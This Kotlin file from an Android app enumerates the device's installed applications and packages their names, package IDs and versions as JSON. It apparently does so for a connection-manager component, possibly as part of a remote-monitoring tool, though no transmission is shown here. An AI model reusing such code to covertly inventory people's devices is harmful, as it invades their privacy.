package com.neaking

import android.annotation.SuppressLint
import android.content.pm.PackageInfo
import com.neaking.ConnectionManager.context
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject

object AppList {
    @SuppressLint("QueryPermissionsNeeded")
    fun getInstalledApps(getSysPackages: Boolean): JSONObject {
        val apps = JSONArray()
        val packs: List<PackageInfo> = context?.packageManager?.getInstalledPackages(0) as List<PackageInfo>
        for (i in packs.indices) {
            val p = packs[i]
            if (!getSysPackages && p.versionName == null) {
                continue
            }
            try {
                val newInfo = JSONObject()
                val appname = p.applicationInfo.loadLabel(context!!.packageManager).toString()
                val pname = p.packageName
                val versionName = p.versionName
                val versionCode = p.versionCode
                newInfo.put("appName", appname)
                newInfo.put("packageName", pname)
                newInfo.put("versionName", versionName)
                newInfo.put("versionCode", versionCode)
                apps.put(newInfo)
            } catch (e: JSONException) {
            }
        }
        val data = JSONObject()
        try {
            data.put("apps", apps)
        } catch (e: JSONException) {
        }
        return data
    }
}